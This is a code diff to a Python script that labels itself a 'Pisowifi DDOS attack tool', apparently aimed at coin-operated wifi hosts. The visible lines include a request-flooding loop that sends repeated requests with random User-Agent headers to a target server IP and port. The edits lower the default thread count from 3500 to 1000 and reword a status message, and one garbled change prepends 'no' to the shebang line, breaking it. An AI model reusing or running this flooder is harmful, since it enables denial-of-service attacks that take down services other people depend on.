@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+no#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
 #  Pisowifi DDOS attack tool.
@@ -50,7 +50,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mbot is running...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -101,7 +101,7 @@ By using this tool, you agree to comply with all applicable laws and assume full
 	-h : help
 	-s : server ip
 	-p : port default 80
-	-t : turbo default 3500 \033[0m''')
+	-t : turbo default 1000 \033[0m''')
 	sys.exit()
 
 
@@ -114,7 +114,7 @@ def get_parameters():
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 3500 -t 3500")
+	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 1000 -t 1000")
 	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
@@ -129,7 +129,7 @@ def get_parameters():
 	else:
 		port = opts.port
 	if opts.turbo is None:
-		thr = 3500
+		thr = 1000
 	else:
 		thr = opts.turbo
 
